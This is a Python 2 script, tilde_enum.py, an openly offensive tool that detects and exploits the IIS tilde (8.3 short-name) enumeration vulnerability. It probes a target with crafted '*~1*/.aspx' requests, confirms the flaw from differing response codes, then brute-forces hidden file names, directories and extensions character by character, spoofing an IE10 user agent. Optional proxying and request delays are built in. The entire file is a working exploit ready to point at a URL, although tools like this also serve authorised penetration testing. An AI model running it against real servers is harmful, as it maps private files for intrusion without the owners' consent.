#!/usr/bin/env python

"""
-------------------------------------------------------------------------------
Name:       tilde_enum.py
Purpose:    Find dir/file names from the tilde enumeration vuln
Author:     esaBear
Fork from:  Micah Hoffman (@WebBreacher)
-------------------------------------------------------------------------------
"""

import os
import sys
import ctypes
import argparse
import random
import string
import itertools
import urllib2
from urlparse import urlparse
from time import sleep

#=================================================
# Constants and Variables
#=================================================

# In the 'headers' below, change the data that you want sent to the remote server
# This is an IE10 user agent
headers = {'User-Agent': 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)'}

# Targets is the list of files from the scanner output
targets = []

# Findings is the list of URLs that may be good on the web site
findings_new = []
# TODO - Are all of these really necessary?
findings_file =  {}      # Files discovered
findings_other = []      # HTTP Response Codes other than 200
findings_final = []      # Where the guessed files are output
findings_dir =   []      # Directories discovered
findings_dir_other =        []
findings_dir_final =        []
findings_dir_other_final =  []

# Location of the extension brute force word list
exts = 'exts'

# Character set to use for brute forcing
chars = 'abcdefghijklmnopqrstuvwxyz1234567890-_(),'

# Response codes - user and error
response_code = {}

# Terminal handler
std_out_handle = ctypes.windll.kernel32.GetStdHandle(-11)


#=================================================
# Functions & Classes
#=================================================


def printResult(msg, color='', level=1):
    # print and output to file.
    # level = 0 : Mute on screen
    # level = 1 : Important messages
    # level = 2 : More details
    if args.verbose_level >= level:
        sys.stdout.write('                                                   \r')
        sys.stdout.flush()
        if color:
            if os.name == "nt":
                ctypes.windll.kernel32.SetConsoleTextAttribute(std_out_handle, color)
                print msg
                ctypes.windll.kernel32.SetConsoleTextAttribute(std_out_handle, bcolors.ENDC)
            else:
                print color + msg + bcolors.ENDC
        else:
            print msg
    if args.out_file:
        if args.verbose_level >= level or level == 1:
            f = open(args.out_file, 'a+')
            f.write(msg + '\n')
            f.close()

def checkOs():
    # Check operating system for colorization
    if os.name == "nt":
        operating_system = "windows"
    else:
        operating_system = "posix"
    return operating_system


def getWebServerResponse(url):
    # This function takes in a URL and outputs the HTTP response code and content length (or error)
    try:
        sleep(args.wait)
        req = urllib2.Request(url, None, headers)
        response = urllib2.urlopen(req)
        return response
    except urllib2.HTTPError as e:
        #ignore HTTPError (404, 400 etc)
        return e
    except urllib2.URLError as e:
        printResult('[!]  Connection URLError: ' + str(e.reason), bcolors.RED, 2)
        sys.exit()
    except Exception as e:
        printResult('[!]  Connection Error: Unkown', bcolors.RED)
        sys.exit()


def initialCheckUrl(url):
    # This function checks to see if the web server is running and what kind of response codes
    # come back from bad requests (this will be important later)

    # Need to split url into protocol://host|IP and then the path
    u = urlparse(url)

    # Make a string that we can use to ensure we know what a "not found" response looks like
    not_there_string = ''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits) for x in range(13))
    printResult('[-]  Testing with dummy file request %s://%s%s%s.htm' % (u.scheme, u.netloc, u.path, not_there_string), bcolors.GREEN)
    not_there_url = u.scheme + '://' + u.netloc + u.path + not_there_string + '.htm'

    # Make the dummy request to the remote server
    not_there_response = getWebServerResponse(not_there_url)

    # Create a content length
    not_there_response_content_length = len(not_there_response.read())

    if not_there_response.getcode():
        printResult('[-]    URLNotThere -> HTTP Code: %s, Response Length: %s' % (not_there_response.getcode(), not_there_response_content_length))
        response_code['not_there_code'], response_code['not_there_length'] = not_there_response.getcode(), not_there_response_content_length
    else:
        printResult('[+]    URLNotThere -> HTTP Code: %s, Error Code: %s' % (not_there_response.code, not_there_response.reason))
        response_code['not_there_code'], response_code['not_there_reason'] = not_there_response.code

    # Check if we didn't get a 404. This would indicate custom error messages or some redirection and will cause issues later.
    if response_code['not_there_code'] != 404:
        printResult('[!]  FALSE POSITIVE ALERT: We may have a problem determining real responses since we did not get a 404 back.', bcolors.RED)

    # Now that we have the "definitely not there" page, check for one that should be there
    printResult('[-]  Testing with user-submitted %s' % url, bcolors.GREEN)
    url_response = getWebServerResponse(url)
    if url_response.getcode():
        response_code['user_length'] = len(url_response.read())
        response_code['user_code'] = url_response.getcode()
        printResult('[-]    URLUser -> HTTP Code: %s, Response Length: %s' % (response_code['user_code'], response_code['user_length']))
    else:
        printResult('[+]    URLUser -> HTTP Code: %s, Error Code: %s' % (url_response.code, url_response.reason))
        response_code['user_code'], response_code['user_reason'] = url_response.code, url_response.reason

    # Check if we got an HTTP response code of 200.
    if response_code['user_code'] != 200:
        printResult('[!]  WARNING: We did not receive an HTTP response code 200 back with given url.', bcolors.RED)
        #sys.exit()
    else:
        return response_code

def checkVulnerableString(url):
    # Set the default string to be IIS6.x
    check_string = '*~1*/.aspx' if args.directory_only == False else '*~1/.aspx'

    # Check if the server is IIS and vuln to tilde directory enumeration
    if args.f:
        printResult('[!]  You have used the -f switch to force us to scan. Well played. Using the IIS/6 "*~1*/.aspx" string.', bcolors.YELLOW)
        return check_string

    server_header = getWebServerResponse(url)
    if server_header.headers.has_key('server'):
        if 'IIS' in server_header.headers['server'] or 'icrosoft' in server_header.headers['server']:
            printResult('[+]  The server is reporting that it is IIS (%s).' % server_header.headers['server'], bcolors.GREEN)
            if   '5.' in server_header.headers['server']:
                check_string = '*~1*'
            elif '6.' in server_header.headers['server']:
                pass # just use the default string already set
        else:
            printResult('[!]  Warning. Server is not reporting that it is IIS.', bcolors.RED)
            printResult('[!]     (Response code: %s)' % server_header.getcode(), bcolors.RED)
    else:
        printResult('[!]  Error. Server is not reporting that it is IIS.', bcolors.RED)
        printResult('[!]     (Response code: %s)' % server_header.getcode(), bcolors.RED)

    # Check to see if the server is vulnerable to the tilde vulnerability
    resp1 = getWebServerResponse(args.url + '~1*/.aspx')
    resp2 = getWebServerResponse(args.url + '*~1*/.aspx')
    if resp1.code != resp2.code:
        printResult('[+]  The server is vulnerable to the IIS tilde enumeration vulnerability..', bcolors.YELLOW)
    else:
        printResult('[!]  Error. Server is probably NOT vulnerable or given path is wrong.', bcolors.RED)
        printResult('[!]     If you know it is, use the -f flag to force testing and re-run the script.', bcolors.RED)
        sys.exit()

    return check_string

def addNewFindings(findings=[]):
    findings_new.extend(findings)
    
def findExtensions(url, filename):
    possible_exts = {}
    found_files = []
    notFound = True
    
    if args.verbose_level:
        sys.stdout.write("[-]  Enumerating extensions of %s...  \r" % filename)
        sys.stdout.flush()

    if not args.directory_only:
        for char1 in chars:
            resp1a = getWebServerResponse(url+filename+'*'+char1+'*/.aspx')
            if resp1a.code == 404:  # Got the first valid char
                notFound = False
                possible_exts[char1] = 1
                for char2 in chars:
                    resp2a = getWebServerResponse(url+filename+'*'+char1+char2+'*/.aspx')
                    if resp2a.code == 404:  # Got the second valid char
                        if char1 in possible_exts: del possible_exts[char1]
                        possible_exts[char1+char2] = 1
                        for char3 in chars:
                            resp3a = getWebServerResponse(url+filename+'*'+char1+char2+char3+'/.aspx')
                            if resp3a.code == 404:  # Got the third valid char
                                if char1+char2 in possible_exts: del possible_exts[char1+char2]
                                possible_exts[char1+char2+char3] = 1

    # Check for directory anyway
    if confirmDirectory(url, filename):
        notFound = False
        addNewFindings([filename+'/'])
        printResult('[+]  Found directory:  ' +filename+'/', bcolors.YELLOW)

    if notFound:
        printResult('[!]  Something is wrong:  %s%s/ should be a directory, but the response is strange.'%(url,filename), bcolors.RED)
    else:
        possible_exts = sorted(possible_exts.keys(), key=len, reverse=True)
        while possible_exts:
            item = possible_exts.pop()
            if not any(map(lambda s:s.endswith(item), possible_exts)):
                printResult('[+]  Found file:  ' +filename+'.'+item, bcolors.YELLOW)
                found_files.append(filename+'.'+item)
        addNewFindings(found_files)
    return
    

def confirmDirectory(url, filename):
    resp = getWebServerResponse(url + filename + '/.aspx')
    if resp.code == 404 and 'x-aspnet-version' not in resp.headers:
        return True
    else:
        return False

def counterEnum(url, check_string, found_name):
    # Enumerate ~2 ~3 and so on
    foundNameWithCounter = [found_name+'~1']
    lastCounter = 1
    for i in xrange(2, 10):
        test_name = '%s~%d' % (found_name, i)
        test_url = url + test_name + '*/.aspx'
        resp = getWebServerResponse(test_url)
        if resp.code == 404:
            foundNameWithCounter.append(test_name)
            lastCounter = i
        else: # if ~2 is not existed, no need for ~3
            break

    if lastCounter > 1:
        printResult('[+]  counterEnum: %s~1 to ~%d.'%(found_name,lastCounter), bcolors.GREEN, 2)
    for filename in foundNameWithCounter:
        findExtensions(url, filename)

def charEnum(url, check_string, current_found):
    # Enumerate character recursively
    notFound = True
    current_length = len(current_found)
    if current_length >= 6:
        counterEnum(url, check_string, current_found)
        return
    else:
        # check if there are matched names shorter than 6
        test_url = url + current_found + check_string[1:]
        resp = getWebServerResponse(test_url)
        if resp.code == 404:
            counterEnum(url, check_string, current_found)
            notFound = False
    
    for char in chars:
        # pass filenames that smaller than resume_string
        test_name = current_found + char
        if args.resume_string and test_name < args.resume_string[:current_length+1]: continue

        if args.verbose_level:
            sys.stdout.write("[-]  charEnum: Enumerating.... %s   \r" % test_name )
            sys.stdout.flush()
        
        resp = getWebServerResponse(url + test_name + check_string)
        if resp.code == 404:
            charEnum(url, check_string, test_name)
            notFound = False
    if notFound:
        printResult('[!]  Something is wrong:  %s%s[?] cannot continue. Maybe not in searching charcters.'%(url,current_found), bcolors.RED)
    
def checkEightDotThreeEnum(url, check_string, dirname='/'):
    # Here is where we find the files and dirs using the 404 and 400 errors
    # If the dir var is not passed then we assume this is the root level of the server

    url = url + dirname

    charEnum(url, check_string, '')
    printResult('[-]  Finished doing the 8.3 enumeration for %s.' % dirname, bcolors.GREEN)
    # clear resume string. Since it just work for first directory
    args.resume_string = ''
    return

def printFindings():
    if len(findings_new):
        printResult('\n---------- FINAL OUTPUT ------------------------------')
        for finding in sorted(findings_new):
            printResult(args.url + finding)
        printResult('---------- OUTPUT COMPLETE ---------------------------\n\n\n')
    else:
        printResult('[!]  No Result Found!\n\n\n', bcolors.RED)
        

def main():
    try:
        # Check the User-supplied URL
        if args.url:
            if args.url[-1:] != '/':
                args.url += '/'
            response_code = initialCheckUrl(args.url)
        else:
            printResult('[!]  You need to enter a valid URL for us to test.', bcolors.RED)
            sys.exit()
            
        if args.directory_only:
            printResult('[-]  Directory only mode: on')
            
        if args.resume_string:
            printResult('[-]  Resume from "%s"... characters before this will be ignored.' % args.resume_string)

        if args.wait != 0 :
            printResult('[-]  User-supplied delay detected. Waiting %s seconds between HTTP requests.' % args.wait)

        printResult('[+]  HTTP Response Codes: %s' % response_code, bcolors.PURPLE, 2)

        # Check to see if the remote server is IIS and vulnerable to the Tilde issue
        check_string = checkVulnerableString(args.url)

        # Break apart the url
        url = urlparse(args.url)
        url_good = url.scheme + '://' + url.netloc + url.path

        # Do the initial search for files in the root of the web server
        checkEightDotThreeEnum(url.scheme + '://' + url.netloc, check_string, url.path)
    except KeyboardInterrupt:
        printFindings()
        sys.exit()

    printFindings()
    return


#=================================================
# START
#=================================================

# Command Line Arguments
parser = argparse.ArgumentParser(description='Exploits and expands the file names found from the tilde enumeration vuln')
parser.add_argument('-d', dest='dirwordlist', help='an optional wordlist for directory name content')
parser.add_argument('-f', action='store_true', default=False, help='force testing of the server even if the headers do not report it as an IIS system')
parser.add_argument('-o', dest='out_file',default='', help='Filename to store output')
parser.add_argument('-p', dest='proxy',default='', help='Use a proxy host:port')
parser.add_argument('-u', dest='url', help='URL to scan')
parser.add_argument('-v', dest='verbose_level', type=int, default=1, help='verbose level of output (0~2)')
parser.add_argument('-w', dest='wait', default=0, type=float, help='time in seconds to wait between requests')
parser.add_argument('--resume', dest='resume_string', help='Resume from a given name (length <= 6)')
parser.add_argument('--dir-only', action='store_true', dest='directory_only', default=False, help='Search for directories only')
args = parser.parse_args()

# COLORIZATION OF OUTPUT
# The entire bcolors class was taken verbatim from the Social Engineer's Toolkit (ty @SET)
if checkOs() == "posix":
    class bcolors:
        PURPLE = '\033[95m'        # Verbose
        CYAN = '\033[96m'
        DARKCYAN = '\033[36m'
        BLUE = '\033[94m'
        GREEN = '\033[92m'        # Normal
        YELLOW = '\033[93m'        # Findings
        RED = '\033[91m'        # Errors
        ENDC = '\033[0m'        # End colorization

        def disable(self):
            self.PURPLE = ''
            self.CYAN = ''
            self.BLUE = ''
            self.GREEN = ''
            self.YELLOW = ''
            self.RED = ''
            self.ENDC = ''
            self.DARKCYAN = ''

# If we are running on Windows or something like that then define colors as nothing
else:
    class bcolors:
        PURPLE = 0x05
        CYAN = 0x0B
        DARKCYAN = 0x03
        BLUE = 0x09
        GREEN = 0x0A
        YELLOW = 0x0E
        RED = 0x0C
        ENDC = 0x07

        def disable(self):
            self.PURPLE = ''
            self.CYAN = ''
            self.BLUE = ''
            self.GREEN = ''
            self.YELLOW = ''
            self.RED = ''
            self.ENDC = ''
            self.DARKCYAN = ''

if args.proxy:
    printResult('[-]  Using proxy for requests: ' + args.proxy, bcolors.PURPLE)
    proxy = urllib2.ProxyHandler({'http': args.proxy, 'https': args.proxy})
    opener = urllib2.build_opener(proxy)
    urllib2.install_opener(opener)

if args.verbose_level > 1:
    printResult('[-]  Verbose Level=%d ....brace yourself for additional information.'%args.verbose_level, bcolors.PURPLE, 2)

if __name__ == "__main__": main()
